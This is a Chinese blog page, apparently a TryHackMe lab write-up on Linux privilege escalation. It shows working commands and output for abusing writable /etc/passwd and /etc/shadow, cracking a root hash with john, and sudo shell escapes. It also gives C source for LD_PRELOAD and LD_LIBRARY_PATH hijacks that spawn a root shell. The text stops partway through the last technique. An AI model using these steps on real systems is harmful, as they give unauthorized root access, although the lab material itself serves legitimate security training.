<!DOCTYPE html>
<html lang=zh>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
    <meta name="description" content="Try-Hack-Me:LUNIX提权  可写&#x2F;etc&#x2F;passwd提权  12user@debian:~$ ls -la &#x2F;etc&#x2F;passwd-rw-r--rw- 1 root root 1054 Jan 18 08:22 &#x2F;etc&#x2F;passwd  发现其它用户是具有可写的权限的，先生成一个密码，直接写入一个用户 12user@debian:~$ openssl passwd 1237nuUT">
<meta property="og:type" content="article">
<meta property="og:title" content="try-hack-me:lunix提权">
<meta property="og:url" content="http://example.com/2025/01/18/try-hack-me-lunix%E6%8F%90%E6%9D%83/index.html">
<meta property="og:site_name" content="WangYiHao">
<meta property="og:description" content="Try-Hack-Me:LUNIX提权  可写&#x2F;etc&#x2F;passwd提权  12user@debian:~$ ls -la &#x2F;etc&#x2F;passwd-rw-r--rw- 1 root root 1054 Jan 18 08:22 &#x2F;etc&#x2F;passwd  发现其它用户是具有可写的权限的，先生成一个密码，直接写入一个用户 12user@debian:~$ openssl passwd 1237nuUT">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="http://example.com/2025/01/18/try-hack-me-lunix%E6%8F%90%E6%9D%83/1.png">
<meta property="og:image" content="http://example.com/2025/01/18/try-hack-me-lunix%E6%8F%90%E6%9D%83/2.png">
<meta property="og:image" content="http://example.com/2025/01/18/try-hack-me-lunix%E6%8F%90%E6%9D%83/3.png">
<meta property="og:image" content="http://example.com/2025/01/18/try-hack-me-lunix%E6%8F%90%E6%9D%83/4.png">
<meta property="article:published_time" content="2025-01-18T14:01:15.000Z">
<meta property="article:modified_time" content="2025-01-19T14:37:30.827Z">
<meta property="article:author" content="SunRT">
<meta property="article:tag" content="try-hack-me">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://example.com/2025/01/18/try-hack-me-lunix%E6%8F%90%E6%9D%83/1.png">
    
    
      
        
          <link rel="shortcut icon" href="/images/favicon.ico">
        
      
      
        
          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
        
      
      
        
          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
        
      
    
    <!-- title -->
    <title>try-hack-me:lunix提权</title>
    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
      
<link rel="stylesheet" href="/css/rtl.css">

    
    <!-- rss -->
    
    
<meta name="generator" content="Hexo 7.2.0"></head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/archives/">总览</a></li>
         
          <li><a href="/tags/WEB-CTF/">CTF-WEB</a></li>
         
          <li><a href="/tags/PWN/">CTF-PWN</a></li>
         
          <li><a href="/tags/HACK-MY-VM/">HACK-MY-VM</a></li>
         
          <li><a href="/tags/try-hack-me/">TRY-HACK-ME</a></li>
         
          <li><a href="/tags/Vulhub">VHub</a></li>
         
          <li><a href="/tags/WEB-%E5%AE%89%E5%85%A8">WEB-安全</a></li>
        
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" href="/2025/01/20/hack-my-vm-nebula/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" href="/2025/01/15/bah-esay/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2025/01/18/try-hack-me-lunix%E6%8F%90%E6%9D%83/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2025/01/18/try-hack-me-lunix%E6%8F%90%E6%9D%83/&text=try-hack-me:lunix提权"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2025/01/18/try-hack-me-lunix%E6%8F%90%E6%9D%83/&title=try-hack-me:lunix提权"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2025/01/18/try-hack-me-lunix%E6%8F%90%E6%9D%83/&is_video=false&description=try-hack-me:lunix提权"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=try-hack-me:lunix提权&body=Check out this article: http://example.com/2025/01/18/try-hack-me-lunix%E6%8F%90%E6%9D%83/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2025/01/18/try-hack-me-lunix%E6%8F%90%E6%9D%83/&title=try-hack-me:lunix提权"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2025/01/18/try-hack-me-lunix%E6%8F%90%E6%9D%83/&title=try-hack-me:lunix提权"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2025/01/18/try-hack-me-lunix%E6%8F%90%E6%9D%83/&title=try-hack-me:lunix提权"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2025/01/18/try-hack-me-lunix%E6%8F%90%E6%9D%83/&title=try-hack-me:lunix提权"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2025/01/18/try-hack-me-lunix%E6%8F%90%E6%9D%83/&name=try-hack-me:lunix提权&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2025/01/18/try-hack-me-lunix%E6%8F%90%E6%9D%83/&t=try-hack-me:lunix提权"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
</ul>

    </div>
    <div id="toc">
      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">1.</span> <span class="toc-text">Try-Hack-Me:LUNIX提权</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">1.0.1.</span> <span class="toc-text">可写&#x2F;etc&#x2F;passwd提权</span></a></li><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">1.0.2.</span> <span class="toc-text">可读&#x2F;etc&#x2F;shadow文件提权</span></a></li><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">1.0.3.</span> <span class="toc-text">可写&#x2F;etc&#x2F;shadow文件提取</span></a></li><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">1.0.4.</span> <span class="toc-text">无密码sudo命令提权</span></a></li><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">1.0.5.</span> <span class="toc-text">sudo环境变量提权</span></a></li><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">1.0.6.</span> <span class="toc-text">计划任务提权</span></a></li><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">1.0.7.</span> <span class="toc-text">计划任务-环境变量提权</span></a></li><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">1.0.8.</span> <span class="toc-text">历史命令-密码泄露提权</span></a></li><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">1.0.9.</span> <span class="toc-text">配置文件-密码泄露提权</span></a></li><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">1.0.10.</span> <span class="toc-text">.ssh密钥泄露提权</span></a></li><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">1.0.11.</span> <span class="toc-text">定时任务-通配符绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">1.0.12.</span> <span class="toc-text">SUID&#x2F;SGID可执行文件提权</span></a></li><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">1.0.13.</span> <span class="toc-text">SUID&#x2F;SGID可执行文件提权共享库提权</span></a></li><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">1.0.14.</span> <span class="toc-text">SUID&#x2F;SGID可执行文件环境变量提权</span></a></li><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">1.0.15.</span> <span class="toc-text">SUID&#x2F;SGID可执行文件利用shell功能提权</span></a></li><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">1.0.16.</span> <span class="toc-text">MySql服务漏洞提权</span></a></li><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">1.0.17.</span> <span class="toc-text">内核漏洞提权</span></a></li><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">1.0.18.</span> <span class="toc-text">NFS提权</span></a></li></ol></li></ol></li></ol>
    </div>
  </span>
</div>

    
    <div class="content index py4">
        
        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle" itemprop="name headline">
        try-hack-me:lunix提权
    </h1>



    <div class="meta">
      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span itemprop="name">SunRT</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2025-01-18T14:01:15.000Z" itemprop="datePublished">2025-01-18</time>
        
      
    </div>


      

      
    <div class="article-tag">
        <i class="fas fa-tag"></i>
        <a class="tag-link-link" href="/tags/try-hack-me/" rel="tag">try-hack-me</a>
    </div>


    </div>
  </header>
  

  <div class="content" itemprop="articleBody">
    <h1>Try-Hack-Me:LUNIX提权</h1>

<h3>可写/etc/passwd提权</h3>

<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">user@debian:~$ ls -la /etc/passwd</span><br><span class="line">-rw-r--rw- 1 root root 1054 Jan 18 08:22 /etc/passwd</span><br></pre></td></tr></table></figure>

<p><strong>发现其它用户是具有可写的权限的，先生成一个密码，直接写入一个用户</strong></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">user@debian:~$ openssl passwd 123</span><br><span class="line">7nuUTB.CXLkeo</span><br></pre></td></tr></table></figure>

<p><strong>直接写入如下代码</strong></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sunrt:7nuUTB.CXLkeo:0:0:root:/root:/bin/bash</span><br></pre></td></tr></table></figure>

<p><strong>切换用户直接提权</strong></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">user@debian:~$ su sunrt</span><br><span class="line">Password:</span><br><span class="line">root@debian:/home/user# id</span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br></pre></td></tr></table></figure>

<h3>可读/etc/shadow文件提权</h3>

<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">user@debian:~$ ls -la /etc/shadow</span><br><span class="line">-rw-r--rw- 1 root shadow 752 Jan 18 08:30 /etc/shadow</span><br></pre></td></tr></table></figure>

<p><strong>发现存在读取的权限，直接读取文件</strong></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">user@debian:~$ cat /etc/shadow</span><br><span class="line">root:ga1RMqso6xFeE:17298:0:99999:7:::</span><br><span class="line">daemon:*:17298:0:99999:7:::</span><br><span class="line">bin:*:17298:0:99999:7:::</span><br><span class="line">sys:*:17298:0:99999:7:::</span><br><span class="line">sync:*:17298:0:99999:7:::</span><br><span class="line">games:*:17298:0:99999:7:::</span><br><span class="line">man:*:17298:0:99999:7:::</span><br><span class="line">lp:*:17298:0:99999:7:::</span><br><span class="line">mail:*:17298:0:99999:7:::</span><br><span class="line">news:*:17298:0:99999:7:::</span><br><span class="line">uucp:*:17298:0:99999:7:::</span><br><span class="line">proxy:*:17298:0:99999:7:::</span><br><span class="line">www-data:*:17298:0:99999:7:::</span><br><span class="line">backup:*:17298:0:99999:7:::</span><br><span class="line">list:*:17298:0:99999:7:::</span><br><span class="line">irc:*:17298:0:99999:7:::</span><br><span class="line">gnats:*:17298:0:99999:7:::</span><br><span class="line">nobody:*:17298:0:99999:7:::</span><br><span class="line">libuuid:!:17298:0:99999:7:::</span><br><span class="line">Debian-exim:!:17298:0:99999:7:::</span><br><span class="line">sshd:*:17298:0:99999:7:::</span><br><span class="line">user:$6$M1tQjkeb$M1A/ArH4JeyF1zBJPLQ.TZQR1locUlz0wIZsoY6aDOZRFrYirKDW5IJy32FBGjwYpT2O1zrR2xTROv7wRIkF8.:17298:0:99999:7:::</span><br><span class="line">statd:*:17299:0:99999:7:::</span><br><span class="line">mysql:!:18133:0:99999:7:::</span><br></pre></td></tr></table></figure>

<p><strong>在kali中用john破解root的密码</strong></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">kali@kali [~] ➜  cat x                                                                               [22:09:52]</span><br><span class="line">root:ga1RMqso6xFeE:17298:0:99999:7:::</span><br><span class="line">kali@kali [~] ➜  john --format=crypt  -w=/usr/share/wordlists/rockyou.txt x                          [22:10:45]</span><br><span class="line">Using default input encoding: UTF-8</span><br><span class="line">Loaded 1 password hash (crypt, generic crypt(3) [?/64])</span><br><span class="line">Cost 1 (algorithm [1:descrypt 2:md5crypt 3:sunmd5 4:bcrypt 5:sha256crypt 6:sha512crypt]) is 1 for all loaded hashes</span><br><span class="line">Cost 2 (algorithm specific iterations) is 1 for all loaded hashes</span><br><span class="line">Will run 4 OpenMP threads</span><br><span class="line">Press &#x27;q&#x27; or Ctrl-C to abort, almost any other key for status</span><br><span class="line">123              (root)</span><br><span class="line">1g 0:00:00:00 DONE (2025-01-18 22:10) 50.00g/s 201600p/s 201600c/s 201600C/s buffy..pokpok</span><br><span class="line">Use the &quot;--show&quot; option to display all of the cracked passwords reliably</span><br><span class="line">Session completed.</span><br></pre></td></tr></table></figure>

<p><strong>登录即可</strong></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">user@debian:~$ su root</span><br><span class="line">Password:</span><br><span class="line">root@debian:/home/user# id</span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br></pre></td></tr></table></figure>

<h3>可写/etc/shadow文件提取</h3>

<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">user@debian:~$ ls -la /etc/shadow</span><br><span class="line">-rw-r--rw- 1 root shadow 752 Jan 18 08:30 /etc/shadow</span><br></pre></td></tr></table></figure>

<p><strong>发现文件可写，直接生成密码，替换root的原来的密码</strong></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">user@debian:~$ openssl passwd 456</span><br><span class="line">ha0MYtvDLu6iM</span><br><span class="line">user@debian:~$ cat /etc/shadow</span><br><span class="line">root:ha0MYtvDLu6iM:17298:0:99999:7:::</span><br><span class="line">daemon:*:17298:0:99999:7:::</span><br><span class="line">bin:*:17298:0:99999:7:::</span><br><span class="line">sys:*:17298:0:99999:7:::</span><br><span class="line">sync:*:17298:0:99999:7:::</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<p><strong>登录即可</strong></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">user@debian:~$ su root</span><br><span class="line">Password:</span><br><span class="line">root@debian:/home/user# whoami</span><br><span class="line">root</span><br></pre></td></tr></table></figure>

<h3>无密码sudo命令提权</h3>

<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">root@debian:/home/user# sudo -l</span><br><span class="line">Matching Defaults entries for root on this host:</span><br><span class="line">    env_reset, env_keep+=LD_PRELOAD, env_keep+=LD_LIBRARY_PATH</span><br><span class="line"></span><br><span class="line">User root may run the following commands on this host:</span><br><span class="line">    (ALL) ALL</span><br><span class="line">root@debian:/home/user# exit</span><br><span class="line">exit</span><br><span class="line">user@debian:~$ sudo -l</span><br><span class="line">Matching Defaults entries for user on this host:</span><br><span class="line">    env_reset, env_keep+=LD_PRELOAD, env_keep+=LD_LIBRARY_PATH</span><br><span class="line"></span><br><span class="line">User user may run the following commands on this host:</span><br><span class="line">    (root) NOPASSWD: /usr/sbin/iftop</span><br><span class="line">    (root) NOPASSWD: /usr/bin/find</span><br><span class="line">    (root) NOPASSWD: /usr/bin/nano</span><br><span class="line">    (root) NOPASSWD: /usr/bin/vim</span><br><span class="line">    (root) NOPASSWD: /usr/bin/man</span><br><span class="line">    (root) NOPASSWD: /usr/bin/awk</span><br><span class="line">    (root) NOPASSWD: /usr/bin/less</span><br><span class="line">    (root) NOPASSWD: /usr/bin/ftp</span><br><span class="line">    (root) NOPASSWD: /usr/bin/nmap</span><br><span class="line">    (root) NOPASSWD: /usr/sbin/apache2</span><br><span class="line">    (root) NOPASSWD: /bin/more</span><br></pre></td></tr></table></figure>

<p><strong>发现超级多的可以以root身份运行的无密码命令，这里面的大多是都是可以sudo提权的，具体可以参考<a target="_blank" rel="noopener" href="https://gtfobins.github.io/">GTFOBins</a>，我这里以vim为例子</strong></p>
<p><img src="/2025/01/18/try-hack-me-lunix%E6%8F%90%E6%9D%83/1.png" alt="1"></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">user@debian:~$ sudo /usr/bin/vim  -c &#x27;:!/bin/sh&#x27;</span><br><span class="line"></span><br><span class="line">sh-4.1# id</span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br></pre></td></tr></table></figure>

<p><strong>很多命令的提权是可以直接在该网站上查询的，非常方便，不多演示</strong></p>
<h3>sudo环境变量提权</h3>

<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">user@debian:~$ sudo -l</span><br><span class="line">Matching Defaults entries for user on this host:</span><br><span class="line">    env_reset, env_keep+=LD_PRELOAD, env_keep+=LD_LIBRARY_PATH</span><br><span class="line">User user may run the following commands on this host:</span><br><span class="line">    (root) NOPASSWD: /usr/sbin/iftop</span><br><span class="line">    (root) NOPASSWD: /usr/bin/find</span><br><span class="line">    (root) NOPASSWD: /usr/bin/nano</span><br><span class="line">    (root) NOPASSWD: /usr/bin/vim</span><br><span class="line">    (root) NOPASSWD: /usr/bin/man</span><br><span class="line">    (root) NOPASSWD: /usr/bin/awk</span><br><span class="line">    (root) NOPASSWD: /usr/bin/less</span><br><span class="line">    (root) NOPASSWD: /usr/bin/ftp</span><br><span class="line">    (root) NOPASSWD: /usr/bin/nmap</span><br><span class="line">    (root) NOPASSWD: /usr/sbin/apache2</span><br><span class="line">    (root) NOPASSWD: /bin/more</span><br></pre></td></tr></table></figure>

<p><strong>只看前面的，来解释一下这两个东西是干啥的</strong></p>
<p><strong>&lt;1&gt;<code>env_keep+=LD_PRELOAD</code> 表示即使使用 <code>sudo</code> 执行命令时，<code>LD_PRELOAD</code> 这个变量也会被保留下来。这样，用户仍然能够通过这个变量来加载特定的共享库，可能是为了调试、绕过某些限制，或者做其他高级操作</strong></p>
<p><strong>&lt;2&gt;<code>LD_LIBRARY_PATH</code> 是一个环境变量，指定了程序在运行时查找共享库的路径。它包含一个以冒号（<code>:</code>）分隔的路径列表，操作系统会按照这些路径顺序查找所需的共享库,<code>sudo</code> 命令确保在执行命令时保留这个变量，使得程序可以按照用户定义的路径查找共享库。</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> _init() &#123;</span><br><span class="line">        unsetenv(<span class="string">&quot;LD_PRELOAD&quot;</span>); <span class="comment">//unsetenv 函数：清除环境变量 LD_PRELOAD 防止其他共享库的 LD_PRELOAD 环境变量干扰当前加载的恶意共享库，确保劫持过程稳定执行</span></span><br><span class="line">        setresuid(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">        system(<span class="string">&quot;/bin/bash -p&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//_init 是共享库中的一个特殊函数名。在动态链接器加载共享库时，会自动调用 _init 函数（类似构造函数的效果），无需显式调用。这是通过动态链接器的机制实现的</span></span><br></pre></td></tr></table></figure>

<p><strong>向机器写入一个C语言程序，命令以root身份开启一个bash，将其编译成共享库文件，即.so文件，没有gcc就kali编译，传到靶机</strong></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">user@debian:~$ gcc -fPIC -shared -nostartfiles -o /tmp/preload.so /home/user/tools/sudo/preload.c</span><br><span class="line">user@debian:~$ ls -la /tmp</span><br><span class="line">total 116</span><br><span class="line">drwxrwxrwt  2 root root  4096 Jan 18 09:37 .</span><br><span class="line">drwxr-xr-x 22 root root  4096 Aug 25  2019 ..</span><br><span class="line">-rw-r--r--  1 root root 94636 Jan 18 09:37 backup.tar.gz</span><br><span class="line">-rwxr-xr-x  1 user user  3857 Jan 18 09:37 preload.so</span><br><span class="line">-rw-r--r--  1 root root    29 Jan 18 09:37 useless</span><br></pre></td></tr></table></figure>

<p><strong>随便加入可以sudo执行的命令的前面，即可提权成功</strong></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">User user may run the following commands on this host:</span><br><span class="line">    (root) NOPASSWD: /usr/sbin/iftop</span><br><span class="line">    (root) NOPASSWD: /usr/bin/find</span><br><span class="line">    (root) NOPASSWD: /usr/bin/nano</span><br><span class="line">    (root) NOPASSWD: /usr/bin/vim</span><br><span class="line">    (root) NOPASSWD: /usr/bin/man</span><br><span class="line">    (root) NOPASSWD: /usr/bin/awk</span><br><span class="line">    (root) NOPASSWD: /usr/bin/less</span><br><span class="line">    (root) NOPASSWD: /usr/bin/ftp</span><br><span class="line">    (root) NOPASSWD: /usr/bin/nmap</span><br><span class="line">    (root) NOPASSWD: /usr/sbin/apache2</span><br><span class="line">    (root) NOPASSWD: /bin/more</span><br><span class="line">user@debian:~$ sudo LD_PRELOAD=/tmp/preload.so /usr/bin/less</span><br><span class="line">root@debian:/home/user# id</span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br><span class="line">user@debian:~$ sudo LD_PRELOAD=/tmp/preload.so /usr/bin/vim</span><br><span class="line">root@debian:/home/user# id</span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br></pre></td></tr></table></figure>

<p><strong>上面就是env_keep+&#x3D;LD_PRELOAD的利用，接下来介绍env_keep+&#x3D;LD_LIBRARY_PATH的利用</strong></p>
<p><strong>写一个C程序，注意与前面的代码稍有不同</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">hijack</span><span class="params">()</span> __<span class="title function_">attribute__</span><span class="params">((constructor))</span>; <span class="comment">//声明一个静态函数 hijack 并通过 __attribute__((constructor)) 修饰。constructor 属性：标记的函数会在共享库加载时，或者在程序调用 main() 函数之前自动执行</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">hijack</span><span class="params">()</span> &#123;</span><br><span class="line">        unsetenv(<span class="string">&quot;LD_LIBRARY_PATH&quot;</span>);</span><br><span class="line">        setresuid(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">        system(<span class="string">&quot;/bin/bash -p&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

